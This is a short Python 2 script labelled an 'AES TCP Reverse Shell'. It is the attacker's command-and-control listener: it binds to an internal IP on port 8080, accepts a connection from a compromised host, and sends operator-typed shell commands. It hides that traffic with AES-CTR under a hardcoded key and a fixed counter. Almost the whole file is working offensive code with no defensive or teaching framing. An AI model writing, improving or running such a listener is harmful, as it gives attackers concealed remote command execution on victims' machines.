#Python AES TCP Reverse Shell
#Author: Uriel Cabrera

import socket    
from Crypto.Cipher import AES


counter = "H"*16
key = "H"*32



def encrypt(message):
    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return encrypto.encrypt(message)

def decrypt(message):
    decrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return  decrypto.decrypt(message) 
 



def connect():
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
    
    s.bind(("10.10.10.100", 8080))                           
    
    s.listen(1)                                             
                                                            
    
    print '[+] Listening for incoming TCP connection on port 8080'
    
    conn, addr = s.accept()     
    
    print '[+] We got a connection from: ', addr


    while True:
        
        command = raw_input("Shell> ")
        if 'terminate' in command:       
            conn.send('terminate')
            conn.close()
            break

        else:
            command = encrypt(command)
            conn.send(command)    
            print decrypt ( conn.recv(1024) )
        
def main ():
    connect()
main()











